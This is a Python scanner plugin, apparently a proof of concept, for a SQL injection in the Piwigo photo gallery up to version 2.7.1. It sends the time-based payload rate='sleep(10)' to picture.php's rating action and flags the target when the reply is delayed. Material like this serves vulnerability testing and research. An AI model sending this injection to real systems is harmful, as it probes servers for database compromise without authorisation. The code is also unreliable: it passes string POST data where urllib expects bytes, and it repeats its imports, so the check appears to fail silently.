# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import time


class Vuln(ABVuln):
    vuln_id = 'Piwigo_0001'  # 平台漏洞编号，留空
    name = 'Piwigo <= v2.7.1 /functions_rate.inc.php SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-12-28'  # 漏洞公布时间
    desc = '''
        Piwigo是一个基于MySQL5与PHP5开发的相册系统.提供基本的发布和管理照片功能,按多种方式浏览如类别,标签,时间等。
        由于functions_rate.inc.php文件中的rate_picture函数没有对传入的$rate变量进行过滤，直接拼接到SQL中执行。
    '''  # 漏洞描述
    ref = 'http://www.freebuf.com/articles/web/55075.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Piwigo'  # 漏洞应用名称
    product_version = '<= v2.7.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e1d716f1-e6b3-4063-9b30-0e2437b2db0b'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            verify_url = '%s/picture.php?/3/category/1/&action=rate' % self.target
            data = {'rate': 'sleep(10)'}
            req = urllib.request.Request(verify_url)
            data = urllib.parse.urlencode(data)
            opener = urllib.request.build_opener(
                urllib.request.HTTPCookieProcessor())
            a = time.time()
            response = opener.open(req, data)
            b = time.time()
            req = urllib.request.Request(verify_url)
            c = b-a

            if c >= 10 and c <= 15:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
